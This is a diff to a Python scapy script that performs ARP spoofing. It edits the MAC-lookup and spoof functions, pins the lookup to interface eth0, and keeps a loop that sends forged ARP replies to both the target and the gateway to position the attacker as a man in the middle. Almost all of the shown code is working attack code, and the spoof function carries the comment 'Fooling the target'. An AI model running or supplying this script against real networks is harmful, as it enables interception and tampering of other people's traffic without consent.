@@ -16,22 +16,22 @@ def get_terminal_cmd():
    args = parser.parse_args()
    return args
 
-
+def get_mac1(ip) -> str:
+   from scapy.layers.l2 import getmacbyip
+   return getmacbyip(ip)
 
 def get_mac(ip)-> str:
-  
-    arp_request = scapy.ARP(pdst = ip)
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast/arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-    
-    return answered_list[0][1].hwsrc
+   arp_request = scapy.ARP(pdst = ip)
+   broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+   arp_request_broadcast = broadcast/arp_request
+   answered_list = scapy.srp(arp_request_broadcast, iface="eth0", timeout=1, verbose=False)[0]
+   return answered_list[0][1].hwsrc
     
 
 def spoof(target_ip, source_ip):
-      target_mac = get_mac(target_ip)
-      packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip) # Fooling the target
-      scapy.send(packet, verbose=False)
+   target_mac = get_mac(target_ip)
+   packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip) # Fooling the target
+   scapy.send(packet, verbose=False)
 
 
 def restore(des_ip, src_ip):
@@ -47,7 +47,6 @@ gateway_ip = args.source
 try:
    sent_packet_count = 0
    while True:
-
       spoof(target_ip, gateway_ip)
       spoof(gateway_ip, target_ip)
       sent_packet_count += 2
